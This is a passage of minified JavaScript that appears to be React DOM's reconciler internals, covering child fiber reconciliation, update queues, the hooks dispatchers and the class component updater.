                    for (; g !== null;) t(m, g), g = g.sibling;
                    return null
                }

                function r(m, g) {
                    for (m = new Map; g !== null;) g.key !== null ? m.set(g.key, g) : m.set(g.index, g), g = g.sibling;
                    return m
                }

                function i(m, g) {
                    return m = Xr(m, g), m.index = 0, m.sibling = null, m
                }

                function o(m, g, y) {
                    return m.index = y, e ? (y = m.alternate, y !== null ? (y = y.index, y < g ? (m.flags |= 2, g) : y) : (m.flags |= 2, g)) : (m.flags |= 1048576, g)
                }

                function s(m) {
                    return e && m.alternate === null && (m.flags |= 2), m
                }

                function a(m, g, y, x) {
                    return g === null || g.tag !== 6 ? (g = Df(y, m.mode, x), g.return = m, g) : (g = i(g, y), g.return = m, g)
                }

                function l(m, g, y, x) {
                    var E = y.type;
                    return E === Bo ? c(m, g, y.props.children, x, y.key) : g !== null && (g.elementType === E || typeof E == "object" && E !== null && E.$$typeof === Or && av(E) === g.type) ? (x = i(g, y.props), x.ref = Js(m, g, y), x.return = m, x) : (x = Cc(y.type, y.key, y.props, null, m.mode, x), x.ref = Js(m, g, y), x.return = m, x)
                }

                function u(m, g, y, x) {
                    return g === null || g.tag !== 4 || g.stateNode.containerInfo !== y.containerInfo || g.stateNode.implementation !== y.implementation ? (g = jf(y, m.mode, x), g.return = m, g) : (g = i(g, y.children || []), g.return = m, g)
                }

                function c(m, g, y, x, E) {
                    return g === null || g.tag !== 7 ? (g = Ui(y, m.mode, x, E), g.return = m, g) : (g = i(g, y), g.return = m, g)
                }

                function d(m, g, y) {
                    if (typeof g == "string" && g !== "" || typeof g == "number") return g = Df("" + g, m.mode, y), g.return = m, g;
                    if (typeof g == "object" && g !== null) {
                        switch (g.$$typeof) {
                            case Zl:
                                return y = Cc(g.type, g.key, g.props, null, m.mode, y), y.ref = Js(m, null, g), y.return = m, y;
                            case No:
                                return g = jf(g, m.mode, y), g.return = m, g;
                            case Or:
                                var x = g._init;
                                return d(m, x(g._payload), y)
                        }
                        if (la(g) || qs(g)) return g = Ui(g, m.mode, y, null), g.return = m, g;
                        ac(m, g)
                    }
                    return null
                }

                function f(m, g, y, x) {
                    var E = g !== null ? g.key : null;
                    if (typeof y == "string" && y !== "" || typeof y == "number") return E !== null ? null : a(m, g, "" + y, x);
                    if (typeof y == "object" && y !== null) {
                        switch (y.$$typeof) {
                            case Zl:
                                return y.key === E ? l(m, g, y, x) : null;
                            case No:
                                return y.key === E ? u(m, g, y, x) : null;
                            case Or:
                                return E = y._init, f(m, g, E(y._payload), x)
                        }
                        if (la(y) || qs(y)) return E !== null ? null : c(m, g, y, x, null);
                        ac(m, y)
                    }
                    return null
                }

                function h(m, g, y, x, E) {
                    if (typeof x == "string" && x !== "" || typeof x == "number") return m = m.get(y) || null, a(g, m, "" + x, E);
                    if (typeof x == "object" && x !== null) {
                        switch (x.$$typeof) {
                            case Zl:
                                return m = m.get(x.key === null ? y : x.key) || null, l(g, m, x, E);
                            case No:
                                return m = m.get(x.key === null ? y : x.key) || null, u(g, m, x, E);
                            case Or:
                                var k = x._init;
                                return h(m, g, y, k(x._payload), E)
                        }
                        if (la(x) || qs(x)) return m = m.get(y) || null, c(g, m, x, E, null);
                        ac(g, x)
                    }
                    return null
                }

                function v(m, g, y, x) {
                    for (var E = null, k = null, I = g, _ = g = 0, L = null; I !== null && _ < y.length; _++) {
                        I.index > _ ? (L = I, I = null) : L = I.sibling;
                        var C = f(m, I, y[_], x);
                        if (C === null) {
                            I === null && (I = L);
                            break
                        }
                        e && I && C.alternate === null && t(m, I), g = o(C, g, _), k === null ? E = C : k.sibling = C, k = C, I = L
                    }
                    if (_ === y.length) return n(m, I), Be && Ei(m, _), E;
                    if (I === null) {
                        for (; _ < y.length; _++) I = d(m, y[_], x), I !== null && (g = o(I, g, _), k === null ? E = I : k.sibling = I, k = I);
                        return Be && Ei(m, _), E
                    }
                    for (I = r(m, I); _ < y.length; _++) L = h(I, m, _, y[_], x), L !== null && (e && L.alternate !== null && I.delete(L.key === null ? _ : L.key), g = o(L, g, _), k === null ? E = L : k.sibling = L, k = L);
                    return e && I.forEach(function(M) {
                        return t(m, M)
                    }), Be && Ei(m, _), E
                }

                function p(m, g, y, x) {
                    var E = qs(y);
                    if (typeof E != "function") throw Error(H(150));
                    if (y = E.call(y), y == null) throw Error(H(151));
                    for (var k = E = null, I = g, _ = g = 0, L = null, C = y.next(); I !== null && !C.done; _++, C = y.next()) {
                        I.index > _ ? (L = I, I = null) : L = I.sibling;
                        var M = f(m, I, C.value, x);
                        if (M === null) {
                            I === null && (I = L);
                            break
                        }
                        e && I && M.alternate === null && t(m, I), g = o(M, g, _), k === null ? E = M : k.sibling = M, k = M, I = L
                    }
                    if (C.done) return n(m, I), Be && Ei(m, _), E;
                    if (I === null) {
                        for (; !C.done; _++, C = y.next()) C = d(m, C.value, x), C !== null && (g = o(C, g, _), k === null ? E = C : k.sibling = C, k = C);
                        return Be && Ei(m, _), E
                    }
                    for (I = r(m, I); !C.done; _++, C = y.next()) C = h(I, m, _, C.value, x), C !== null && (e && C.alternate !== null && I.delete(C.key === null ? _ : C.key), g = o(C, g, _), k === null ? E = C : k.sibling = C, k = C);
                    return e && I.forEach(function(F) {
                        return t(m, F)
                    }), Be && Ei(m, _), E
                }

                function w(m, g, y, x) {
                    if (typeof y == "object" && y !== null && y.type === Bo && y.key === null && (y = y.props.children), typeof y == "object" && y !== null) {
                        switch (y.$$typeof) {
                            case Zl:
                                e: {
                                    for (var E = y.key, k = g; k !== null;) {
                                        if (k.key === E) {
                                            if (E = y.type, E === Bo) {
                                                if (k.tag === 7) {
                                                    n(m, k.sibling), g = i(k, y.props.children), g.return = m, m = g;
                                                    break e
                                                }
                                            } else if (k.elementType === E || typeof E == "object" && E !== null && E.$$typeof === Or && av(E) === k.type) {
                                                n(m, k.sibling), g = i(k, y.props), g.ref = Js(m, k, y), g.return = m, m = g;
                                                break e
                                            }
                                            n(m, k);
                                            break
                                        } else t(m, k);
                                        k = k.sibling
                                    }
                                    y.type === Bo ? (g = Ui(y.props.children, m.mode, x, y.key), g.return = m, m = g) : (x = Cc(y.type, y.key, y.props, null, m.mode, x), x.ref = Js(m, g, y), x.return = m, m = x)
                                }
                                return s(m);
                            case No:
                                e: {
                                    for (k = y.key; g !== null;) {
                                        if (g.key === k)
                                            if (g.tag === 4 && g.stateNode.containerInfo === y.containerInfo && g.stateNode.implementation === y.implementation) {
                                                n(m, g.sibling), g = i(g, y.children || []), g.return = m, m = g;
                                                break e
                                            } else {
                                                n(m, g);
                                                break
                                            }
                                        else t(m, g);
                                        g = g.sibling
                                    }
                                    g = jf(y, m.mode, x),
                                    g.return = m,
                                    m = g
                                }
                                return s(m);
                            case Or:
                                return k = y._init, w(m, g, k(y._payload), x)
                        }
                        if (la(y)) return v(m, g, y, x);
                        if (qs(y)) return p(m, g, y, x);
                        ac(m, y)
                    }
                    return typeof y == "string" && y !== "" || typeof y == "number" ? (y = "" + y, g !== null && g.tag === 6 ? (n(m, g.sibling), g = i(g, y), g.return = m, m = g) : (n(m, g), g = Df(y, m.mode, x), g.return = m, m = g), s(m)) : n(m, g)
                }
                return w
            }
            var as = Sw(!0),
                kw = Sw(!1),
                Jc = hi(null),
                Xc = null,
                $o = null,
                Cm = null;

            function Pm() {
                Cm = $o = Xc = null
            }

            function Rm(e) {
                var t = Jc.current;
                Ce(Jc), e._currentValue = t
            }

            function Wh(e, t, n) {
                for (; e !== null;) {
                    var r = e.alternate;
                    if ((e.childLanes & t) !== t ? (e.childLanes |= t, r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
                    e = e.return
                }
            }

            function Zo(e, t) {
                Xc = e, Cm = $o = null, e = e.dependencies, e !== null && e.firstContext !== null && (e.lanes & t && (Mt = !0), e.firstContext = null)
            }

            function hn(e) {
                var t = e._currentValue;
                if (Cm !== e)
                    if (e = {
                            context: e,
                            memoizedValue: t,
                            next: null
                        }, $o === null) {
                        if (Xc === null) throw Error(H(308));
                        $o = e, Xc.dependencies = {
                            lanes: 0,
                            firstContext: e
                        }
                    } else $o = $o.next = e;
                return t
            }
            var Pi = null;

            function Nm(e) {
                Pi === null ? Pi = [e] : Pi.push(e)
            }

            function Tw(e, t, n, r) {
                var i = t.interleaved;
                return i === null ? (n.next = n, Nm(t)) : (n.next = i.next, i.next = n), t.interleaved = n, br(e, r)
            }

            function br(e, t) {
                e.lanes |= t;
                var n = e.alternate;
                for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null;) e.childLanes |= t, n = e.alternate, n !== null && (n.childLanes |= t), n = e, e = e.return;
                return n.tag === 3 ? n.stateNode : null
            }
            var Lr = !1;

            function Bm(e) {
                e.updateQueue = {
                    baseState: e.memoizedState,
                    firstBaseUpdate: null,
                    lastBaseUpdate: null,
                    shared: {
                        pending: null,
                        interleaved: null,
                        lanes: 0
                    },
                    effects: null
                }
            }

            function Iw(e, t) {
                e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
                    baseState: e.baseState,
                    firstBaseUpdate: e.firstBaseUpdate,
                    lastBaseUpdate: e.lastBaseUpdate,
                    shared: e.shared,
                    effects: e.effects
                })
            }

            function mr(e, t) {
                return {
                    eventTime: e,
                    lane: t,
                    tag: 0,
                    payload: null,
                    callback: null,
                    next: null
                }
            }

            function Zr(e, t, n) {
                var r = e.updateQueue;
                if (r === null) return null;
                if (r = r.shared, me & 2) {
                    var i = r.pending;
                    return i === null ? t.next = t : (t.next = i.next, i.next = t), r.pending = t, br(e, n)
                }
                return i = r.interleaved, i === null ? (t.next = t, Nm(r)) : (t.next = i.next, i.next = t), r.interleaved = t, br(e, n)
            }

            function Ac(e, t, n) {
                if (t = t.updateQueue, t !== null && (t = t.shared, (n & 4194240) !== 0)) {
                    var r = t.lanes;
                    r &= e.pendingLanes, n |= r, t.lanes = n, ym(e, n)
                }
            }

            function lv(e, t) {
                var n = e.updateQueue,
                    r = e.alternate;
                if (r !== null && (r = r.updateQueue, n === r)) {
                    var i = null,
                        o = null;
                    if (n = n.firstBaseUpdate, n !== null) {
                        do {
                            var s = {
                                eventTime: n.eventTime,
                                lane: n.lane,
                                tag: n.tag,
                                payload: n.payload,
                                callback: n.callback,
                                next: null
                            };
                            o === null ? i = o = s : o = o.next = s, n = n.next
                        } while (n !== null);
                        o === null ? i = o = t : o = o.next = t
                    } else i = o = t;
                    n = {
                        baseState: r.baseState,
                        firstBaseUpdate: i,
                        lastBaseUpdate: o,
                        shared: r.shared,
                        effects: r.effects
                    }, e.updateQueue = n;
                    return
                }
                e = n.lastBaseUpdate, e === null ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t
            }

            function eu(e, t, n, r) {
                var i = e.updateQueue;
                Lr = !1;
                var o = i.firstBaseUpdate,
                    s = i.lastBaseUpdate,
                    a = i.shared.pending;
                if (a !== null) {
                    i.shared.pending = null;
                    var l = a,
                        u = l.next;
                    l.next = null, s === null ? o = u : s.next = u, s = l;
                    var c = e.alternate;
                    c !== null && (c = c.updateQueue, a = c.lastBaseUpdate, a !== s && (a === null ? c.firstBaseUpdate = u : a.next = u, c.lastBaseUpdate = l))
                }
                if (o !== null) {
                    var d = i.baseState;
                    s = 0, c = u = l = null, a = o;
                    do {
                        var f = a.lane,
                            h = a.eventTime;
                        if ((r & f) === f) {
                            c !== null && (c = c.next = {
                                eventTime: h,
                                lane: 0,
                                tag: a.tag,
                                payload: a.payload,
                                callback: a.callback,
                                next: null
                            });
                            e: {
                                var v = e,
                                    p = a;
                                switch (f = t, h = n, p.tag) {
                                    case 1:
                                        if (v = p.payload, typeof v == "function") {
                                            d = v.call(h, d, f);
                                            break e
                                        }
                                        d = v;
                                        break e;
                                    case 3:
                                        v.flags = v.flags & -65537 | 128;
                                    case 0:
                                        if (v = p.payload, f = typeof v == "function" ? v.call(h, d, f) : v, f == null) break e;
                                        d = Fe({}, d, f);
                                        break e;
                                    case 2:
                                        Lr = !0
                                }
                            }
                            a.callback !== null && a.lane !== 0 && (e.flags |= 64, f = i.effects, f === null ? i.effects = [a] : f.push(a))
                        } else h = {
                            eventTime: h,
                            lane: f,
                            tag: a.tag,
                            payload: a.payload,
                            callback: a.callback,
                            next: null
                        }, c === null ? (u = c = h, l = d) : c = c.next = h, s |= f;
                        if (a = a.next, a === null) {
                            if (a = i.shared.pending, a === null) break;
                            f = a, a = f.next, f.next = null, i.lastBaseUpdate = f, i.shared.pending = null
                        }
                    } while (!0);
                    if (c === null && (l = d), i.baseState = l, i.firstBaseUpdate = u, i.lastBaseUpdate = c, t = i.shared.interleaved, t !== null) {
                        i = t;
                        do s |= i.lane, i = i.next; while (i !== t)
                    } else o === null && (i.shared.lanes = 0);
                    Xi |= s, e.lanes = s, e.memoizedState = d
                }
            }

            function cv(e, t, n) {
                if (e = t.effects, t.effects = null, e !== null)
                    for (t = 0; t < e.length; t++) {
                        var r = e[t],
                            i = r.callback;
                        if (i !== null) {
                            if (r.callback = null, r = n, typeof i != "function") throw Error(H(191, i));
                            i.call(r)
                        }
                    }
            }
            var Nl = {},
                zn = hi(Nl),
                Va = hi(Nl),
                Wa = hi(Nl);

            function Ri(e) {
                if (e === Nl) throw Error(H(174));
                return e
            }

            function Mm(e, t) {
                switch (Te(Wa, t), Te(Va, e), Te(zn, Nl), e = t.nodeType, e) {
                    case 9:
                    case 11:
                        t = (t = t.documentElement) ? t.namespaceURI : kh(null, "");
                        break;
                    default:
                        e = e === 8 ? t.parentNode : t, t = e.namespaceURI || null, e = e.tagName, t = kh(t, e)
                }
                Ce(zn), Te(zn, t)
            }

            function ls() {
                Ce(zn), Ce(Va), Ce(Wa)
            }

            function Cw(e) {
                Ri(Wa.current);
                var t = Ri(zn.current),
                    n = kh(t, e.type);
                t !== n && (Te(Va, e), Te(zn, n))
            }

            function Om(e) {
                Va.current === e && (Ce(zn), Ce(Va))
            }
            var Oe = hi(0);

            function tu(e) {
                for (var t = e; t !== null;) {
                    if (t.tag === 13) {
                        var n = t.memoizedState;
                        if (n !== null && (n = n.dehydrated, n === null || n.data === "$?" || n.data === "$!")) return t
                    } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
                        if (t.flags & 128) return t
                    } else if (t.child !== null) {
                        t.child.return = t, t = t.child;
                        continue
                    }
                    if (t === e) break;
                    for (; t.sibling === null;) {
                        if (t.return === null || t.return === e) return null;
                        t = t.return
                    }
                    t.sibling.return = t.return, t = t.sibling
                }
                return null
            }
            var Nf = [];

            function Lm() {
                for (var e = 0; e < Nf.length; e++) Nf[e]._workInProgressVersionPrimary = null;
                Nf.length = 0
            }
            var _c = kr.ReactCurrentDispatcher,
                Bf = kr.ReactCurrentBatchConfig,
                Ji = 0,
                Le = null,
                Qe = null,
                Je = null,
                nu = !1,
                Aa = !1,
                qa = 0,
                NS = 0;

            function at() {
                throw Error(H(321))
            }

            function Fm(e, t) {
                if (t === null) return !1;
                for (var n = 0; n < t.length && n < e.length; n++)
                    if (!Tn(e[n], t[n])) return !1;
                return !0
            }

            function Dm(e, t, n, r, i, o) {
                if (Ji = o, Le = t, t.memoizedState = null, t.updateQueue = null, t.lanes = 0, _c.current = e === null || e.memoizedState === null ? LS : FS, e = n(r, i), Aa) {
                    o = 0;
                    do {
                        if (Aa = !1, qa = 0, 25 <= o) throw Error(H(301));
                        o += 1, Je = Qe = null, t.updateQueue = null, _c.current = DS, e = n(r, i)
                    } while (Aa)
                }
                if (_c.current = ru, t = Qe !== null && Qe.next !== null, Ji = 0, Je = Qe = Le = null, nu = !1, t) throw Error(H(300));
                return e
            }

            function jm() {
                var e = qa !== 0;
                return qa = 0, e
            }

            function Mn() {
                var e = {
                    memoizedState: null,
                    baseState: null,
                    baseQueue: null,
                    queue: null,
                    next: null
                };
                return Je === null ? Le.memoizedState = Je = e : Je = Je.next = e, Je
            }

            function pn() {
                if (Qe === null) {
                    var e = Le.alternate;
                    e = e !== null ? e.memoizedState : null
                } else e = Qe.next;
                var t = Je === null ? Le.memoizedState : Je.next;
                if (t !== null) Je = t, Qe = e;
                else {
                    if (e === null) throw Error(H(310));
                    Qe = e, e = {
                        memoizedState: Qe.memoizedState,
                        baseState: Qe.baseState,
                        baseQueue: Qe.baseQueue,
                        queue: Qe.queue,
                        next: null
                    }, Je === null ? Le.memoizedState = Je = e : Je = Je.next = e
                }
                return Je
            }

            function Qa(e, t) {
                return typeof t == "function" ? t(e) : t
            }

            function Mf(e) {
                var t = pn(),
                    n = t.queue;
                if (n === null) throw Error(H(311));
                n.lastRenderedReducer = e;
                var r = Qe,
                    i = r.baseQueue,
                    o = n.pending;
                if (o !== null) {
                    if (i !== null) {
                        var s = i.next;
                        i.next = o.next, o.next = s
                    }
                    r.baseQueue = i = o, n.pending = null
                }
                if (i !== null) {
                    o = i.next, r = r.baseState;
                    var a = s = null,
                        l = null,
                        u = o;
                    do {
                        var c = u.lane;
                        if ((Ji & c) === c) l !== null && (l = l.next = {
                            lane: 0,
                            action: u.action,
                            hasEagerState: u.hasEagerState,
                            eagerState: u.eagerState,
                            next: null
                        }), r = u.hasEagerState ? u.eagerState : e(r, u.action);
                        else {
                            var d = {
                                lane: c,
                                action: u.action,
                                hasEagerState: u.hasEagerState,
                                eagerState: u.eagerState,
                                next: null
                            };
                            l === null ? (a = l = d, s = r) : l = l.next = d, Le.lanes |= c, Xi |= c
                        }
                        u = u.next
                    } while (u !== null && u !== o);
                    l === null ? s = r : l.next = a, Tn(r, t.memoizedState) || (Mt = !0), t.memoizedState = r, t.baseState = s, t.baseQueue = l, n.lastRenderedState = r
                }
                if (e = n.interleaved, e !== null) {
                    i = e;
                    do o = i.lane, Le.lanes |= o, Xi |= o, i = i.next; while (i !== e)
                } else i === null && (n.lanes = 0);
                return [t.memoizedState, n.dispatch]
            }

            function Of(e) {
                var t = pn(),
                    n = t.queue;
                if (n === null) throw Error(H(311));
                n.lastRenderedReducer = e;
                var r = n.dispatch,
                    i = n.pending,
                    o = t.memoizedState;
                if (i !== null) {
                    n.pending = null;
                    var s = i = i.next;
                    do o = e(o, s.action), s = s.next; while (s !== i);
                    Tn(o, t.memoizedState) || (Mt = !0), t.memoizedState = o, t.baseQueue === null && (t.baseState = o), n.lastRenderedState = o
                }
                return [o, r]
            }

            function Pw() {}

            function Rw(e, t) {
                var n = Le,
                    r = pn(),
                    i = t(),
                    o = !Tn(r.memoizedState, i);
                if (o && (r.memoizedState = i, Mt = !0), r = r.queue, Hm(Mw.bind(null, n, r, e), [e]), r.getSnapshot !== t || o || Je !== null && Je.memoizedState.tag & 1) {
                    if (n.flags |= 2048, Ka(9, Bw.bind(null, n, r, i, t), void 0, null), et === null) throw Error(H(349));
                    Ji & 30 || Nw(n, t, i)
                }
                return i
            }

            function Nw(e, t, n) {
                e.flags |= 16384, e = {
                    getSnapshot: t,
                    value: n
                }, t = Le.updateQueue, t === null ? (t = {
                    lastEffect: null,
                    stores: null
                }, Le.updateQueue = t, t.stores = [e]) : (n = t.stores, n === null ? t.stores = [e] : n.push(e))
            }

            function Bw(e, t, n, r) {
                t.value = n, t.getSnapshot = r, Ow(t) && Lw(e)
            }

            function Mw(e, t, n) {
                return n(function() {
                    Ow(t) && Lw(e)
                })
            }

            function Ow(e) {
                var t = e.getSnapshot;
                e = e.value;
                try {
                    var n = t();
                    return !Tn(e, n)
                } catch {
                    return !0
                }
            }

            function Lw(e) {
                var t = br(e, 1);
                t !== null && _n(t, e, 1, -1)
            }

            function uv(e) {
                var t = Mn();
                return typeof e == "function" && (e = e()), t.memoizedState = t.baseState = e, e = {
                    pending: null,
                    interleaved: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: Qa,
                    lastRenderedState: e
                }, t.queue = e, e = e.dispatch = OS.bind(null, Le, e), [t.memoizedState, e]
            }

            function Ka(e, t, n, r) {
                return e = {
                    tag: e,
                    create: t,
                    destroy: n,
                    deps: r,
                    next: null
                }, t = Le.updateQueue, t === null ? (t = {
                    lastEffect: null,
                    stores: null
                }, Le.updateQueue = t, t.lastEffect = e.next = e) : (n = t.lastEffect, n === null ? t.lastEffect = e.next = e : (r = n.next, n.next = e, e.next = r, t.lastEffect = e)), e
            }

            function Fw() {
                return pn().memoizedState
            }

            function Sc(e, t, n, r) {
                var i = Mn();
                Le.flags |= e, i.memoizedState = Ka(1 | t, n, void 0, r === void 0 ? null : r)
            }

            function wd(e, t, n, r) {
                var i = pn();
                r = r === void 0 ? null : r;
                var o = void 0;
                if (Qe !== null) {
                    var s = Qe.memoizedState;
                    if (o = s.destroy, r !== null && Fm(r, s.deps)) {
                        i.memoizedState = Ka(t, n, o, r);
                        return
                    }
                }
                Le.flags |= e, i.memoizedState = Ka(1 | t, n, o, r)
            }

            function dv(e, t) {
                return Sc(8390656, 8, e, t)
            }

            function Hm(e, t) {
                return wd(2048, 8, e, t)
            }

            function Dw(e, t) {
                return wd(4, 2, e, t)
            }

            function jw(e, t) {
                return wd(4, 4, e, t)
            }

            function Hw(e, t) {
                if (typeof t == "function") return e = e(), t(e),
                    function() {
                        t(null)
                    };
                if (t != null) return e = e(), t.current = e,
                    function() {
                        t.current = null
                    }
            }

            function $w(e, t, n) {
                return n = n != null ? n.concat([e]) : null, wd(4, 4, Hw.bind(null, t, e), n)
            }

            function $m() {}

            function Uw(e, t) {
                var n = pn();
                t = t === void 0 ? null : t;
                var r = n.memoizedState;
                return r !== null && t !== null && Fm(t, r[1]) ? r[0] : (n.memoizedState = [e, t], e)
            }

            function zw(e, t) {
                var n = pn();
                t = t === void 0 ? null : t;
                var r = n.memoizedState;
                return r !== null && t !== null && Fm(t, r[1]) ? r[0] : (e = e(), n.memoizedState = [e, t], e)
            }

            function Gw(e, t, n) {
                return Ji & 21 ? (Tn(n, t) || (n = K1(), Le.lanes |= n, Xi |= n, e.baseState = !0), t) : (e.baseState && (e.baseState = !1, Mt = !0), e.memoizedState = n)
            }

            function BS(e, t) {
                var n = xe;
                xe = n !== 0 && 4 > n ? n : 4, e(!0);
                var r = Bf.transition;
                Bf.transition = {};
                try {
                    e(!1), t()
                } finally {
                    xe = n, Bf.transition = r
                }
            }

            function Vw() {
                return pn().memoizedState
            }

            function MS(e, t, n) {
                var r = Jr(e);
                if (n = {
                        lane: r,
                        action: n,
                        hasEagerState: !1,
                        eagerState: null,
                        next: null
                    }, Ww(e)) qw(t, n);
                else if (n = Tw(e, t, n, r), n !== null) {
                    var i = xt();
                    _n(n, e, r, i), Qw(n, t, r)
                }
            }

            function OS(e, t, n) {
                var r = Jr(e),
                    i = {
                        lane: r,
                        action: n,
                        hasEagerState: !1,
                        eagerState: null,
                        next: null
                    };
                if (Ww(e)) qw(t, i);
                else {
                    var o = e.alternate;
                    if (e.lanes === 0 && (o === null || o.lanes === 0) && (o = t.lastRenderedReducer, o !== null)) try {
                        var s = t.lastRenderedState,
                            a = o(s, n);
                        if (i.hasEagerState = !0, i.eagerState = a, Tn(a, s)) {
                            var l = t.interleaved;
                            l === null ? (i.next = i, Nm(t)) : (i.next = l.next, l.next = i), t.interleaved = i;
                            return
                        }
                    } catch {} finally {}
                    n = Tw(e, t, i, r), n !== null && (i = xt(), _n(n, e, r, i), Qw(n, t, r))
                }
            }

            function Ww(e) {
                var t = e.alternate;
                return e === Le || t !== null && t === Le
            }

            function qw(e, t) {
                Aa = nu = !0;
                var n = e.pending;
                n === null ? t.next = t : (t.next = n.next, n.next = t), e.pending = t
            }

            function Qw(e, t, n) {
                if (n & 4194240) {
                    var r = t.lanes;
                    r &= e.pendingLanes, n |= r, t.lanes = n, ym(e, n)
                }
            }
            var ru = {
                    readContext: hn,
                    useCallback: at,
                    useContext: at,
                    useEffect: at,
                    useImperativeHandle: at,
                    useInsertionEffect: at,
                    useLayoutEffect: at,
                    useMemo: at,
                    useReducer: at,
                    useRef: at,
                    useState: at,
                    useDebugValue: at,
                    useDeferredValue: at,
                    useTransition: at,
                    useMutableSource: at,
                    useSyncExternalStore: at,
                    useId: at,
                    unstable_isNewReconciler: !1
                },
                LS = {
                    readContext: hn,
                    useCallback: function(e, t) {
                        return Mn().memoizedState = [e, t === void 0 ? null : t], e
                    },
                    useContext: hn,
                    useEffect: dv,
                    useImperativeHandle: function(e, t, n) {
                        return n = n != null ? n.concat([e]) : null, Sc(4194308, 4, Hw.bind(null, t, e), n)
                    },
                    useLayoutEffect: function(e, t) {
                        return Sc(4194308, 4, e, t)
                    },
                    useInsertionEffect: function(e, t) {
                        return Sc(4, 2, e, t)
                    },
                    useMemo: function(e, t) {
                        var n = Mn();
                        return t = t === void 0 ? null : t, e = e(), n.memoizedState = [e, t], e
                    },
                    useReducer: function(e, t, n) {
                        var r = Mn();
                        return t = n !== void 0 ? n(t) : t, r.memoizedState = r.baseState = t, e = {
                            pending: null,
                            interleaved: null,
                            lanes: 0,
                            dispatch: null,
                            lastRenderedReducer: e,
                            lastRenderedState: t
                        }, r.queue = e, e = e.dispatch = MS.bind(null, Le, e), [r.memoizedState, e]
                    },
                    useRef: function(e) {
                        var t = Mn();
                        return e = {
                            current: e
                        }, t.memoizedState = e
                    },
                    useState: uv,
                    useDebugValue: $m,
                    useDeferredValue: function(e) {
                        return Mn().memoizedState = e
                    },
                    useTransition: function() {
                        var e = uv(!1),
                            t = e[0];
                        return e = BS.bind(null, e[1]), Mn().memoizedState = e, [t, e]
                    },
                    useMutableSource: function() {},
                    useSyncExternalStore: function(e, t, n) {
                        var r = Le,
                            i = Mn();
                        if (Be) {
                            if (n === void 0) throw Error(H(407));
                            n = n()
                        } else {
                            if (n = t(), et === null) throw Error(H(349));
                            Ji & 30 || Nw(r, t, n)
                        }
                        i.memoizedState = n;
                        var o = {
                            value: n,
                            getSnapshot: t
                        };
                        return i.queue = o, dv(Mw.bind(null, r, o, e), [e]), r.flags |= 2048, Ka(9, Bw.bind(null, r, o, n, t), void 0, null), n
                    },
                    useId: function() {
                        var e = Mn(),
                            t = et.identifierPrefix;
                        if (Be) {
                            var n = hr,
                                r = fr;
                            n = (r & ~(1 << 32 - An(r) - 1)).toString(32) + n, t = ":" + t + "R" + n, n = qa++, 0 < n && (t += "H" + n.toString(32)), t += ":"
                        } else n = NS++, t = ":" + t + "r" + n.toString(32) + ":";
                        return e.memoizedState = t
                    },
                    unstable_isNewReconciler: !1
                },
                FS = {
                    readContext: hn,
                    useCallback: Uw,
                    useContext: hn,
                    useEffect: Hm,
                    useImperativeHandle: $w,
                    useInsertionEffect: Dw,
                    useLayoutEffect: jw,
                    useMemo: zw,
                    useReducer: Mf,
                    useRef: Fw,
                    useState: function() {
                        return Mf(Qa)
                    },
                    useDebugValue: $m,
                    useDeferredValue: function(e) {
                        var t = pn();
                        return Gw(t, Qe.memoizedState, e)
                    },
                    useTransition: function() {
                        var e = Mf(Qa)[0],
                            t = pn().memoizedState;
                        return [e, t]
                    },
                    useMutableSource: Pw,
                    useSyncExternalStore: Rw,
                    useId: Vw,
                    unstable_isNewReconciler: !1
                },
                DS = {
                    readContext: hn,
                    useCallback: Uw,
                    useContext: hn,
                    useEffect: Hm,
                    useImperativeHandle: $w,
                    useInsertionEffect: Dw,
                    useLayoutEffect: jw,
                    useMemo: zw,
                    useReducer: Of,
                    useRef: Fw,
                    useState: function() {
                        return Of(Qa)
                    },
                    useDebugValue: $m,
                    useDeferredValue: function(e) {
                        var t = pn();
                        return Qe === null ? t.memoizedState = e : Gw(t, Qe.memoizedState, e)
                    },
                    useTransition: function() {
                        var e = Of(Qa)[0],
                            t = pn().memoizedState;
                        return [e, t]
                    },
                    useMutableSource: Pw,
                    useSyncExternalStore: Rw,
                    useId: Vw,
                    unstable_isNewReconciler: !1
                };

            function vn(e, t) {
                if (e && e.defaultProps) {
                    t = Fe({}, t), e = e.defaultProps;
                    for (var n in e) t[n] === void 0 && (t[n] = e[n]);
                    return t
                }
                return t
            }

            function qh(e, t, n, r) {
                t = e.memoizedState, n = n(r, t), n = n == null ? t : Fe({}, t, n), e.memoizedState = n, e.lanes === 0 && (e.updateQueue.baseState = n)
            }
            var bd = {
                isMounted: function(e) {
                    return (e = e._reactInternals) ? go(e) === e : !1
                },
                enqueueSetState: function(e, t, n) {
                    e = e._reactInternals;
                    var r = xt(),
                        i = Jr(e),
                        o = mr(r, i);
                    o.payload = t, n != null && (o.callback = n), t = Zr(e, o, i), t !== null && (_n(t, e, i, r), Ac(t, e, i))
                },
                enqueueReplaceState: function(e, t, n) {
                    e = e._reactInternals;
                    var r = xt(),
                        i = Jr(e),
                        o = mr(r, i);
                    o.tag = 1, o.payload = t, n != null && (o.callback = n), t = Zr(e, o, i), t !== null && (_n(t, e, i, r), Ac(t, e, i))
                },
                enqueueForceUpdate: function(e, t) {
                    e = e._reactInternals;
                    var n = xt(),
                        r = Jr(e),
                        i = mr(n, r);
                    i.tag = 2, t != null && (i.callback = t), t = Zr(e, i, r), t !== null && (_n(t, e, r, n), Ac(t, e, r))
                }
            };

            function fv(e, t, n, r, i, o, s) {
                return e = e.stateNode, typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, o, s) : t.prototype && t.prototype.isPureReactComponent ? !$a(n, r) || !$a(i, o) : !0
            }

            function Kw(e, t, n) {
                var r = !1,
                    i = ri,
                    o = t.contextType;
                return typeof o == "object" && o !== null ? o = hn(o) : (i = Dt(t) ? Zi : pt.current, r = t.contextTypes, o = (r = r != null) ? os(e, i) : ri), t = new t(n, o), e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null, t.updater = bd, e.stateNode = t, t._reactInternals = e, r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = i, e.__reactInternalMemoizedMaskedChildContext = o), t
            }

            function hv(e, t, n, r) {
